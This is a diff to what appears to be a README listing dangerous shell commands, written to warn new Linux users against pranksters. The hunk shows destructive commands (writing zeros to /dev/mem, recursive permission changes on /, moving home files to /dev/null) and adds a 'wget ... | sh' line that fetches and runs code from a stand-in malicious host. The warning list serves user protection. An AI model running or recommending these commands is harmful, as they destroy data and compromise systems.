@@ -15,3 +15,5 @@ List of dangerous shell commands to prevent new linux users to get tricked by tr
 12. cat /dev/zero > /dev/mem
 13. sudo chmod -r 444 / or sudo chown -r nobody:nobody /
 14. last | reboot
+15. mv /home/user/* /dev/null
+16. wget http://malicious_source -O- | sh
